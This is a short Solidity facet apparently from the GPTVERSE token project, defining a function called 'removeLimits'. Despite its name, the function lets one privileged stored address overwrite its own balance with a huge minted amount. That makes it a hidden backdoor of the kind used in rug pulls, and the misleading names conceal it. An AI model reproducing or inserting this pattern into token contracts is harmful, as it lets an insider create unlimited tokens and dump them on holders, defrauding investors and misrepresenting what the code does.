/*
 * SPDX-License-Identifier: MIT
 * Website: https://gptverse.art/
 * Twitter: https://twitter.com/gpt_verse
 * Discord: https://discord.gg/Rd8cWjD3
 * Telegram: https://t.me/gpt_verse
 * Linkedin: https://www.linkedin.com/company/gptverse/
 * Youtube: https://www.youtube.com/@GPTVERSE_Official
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
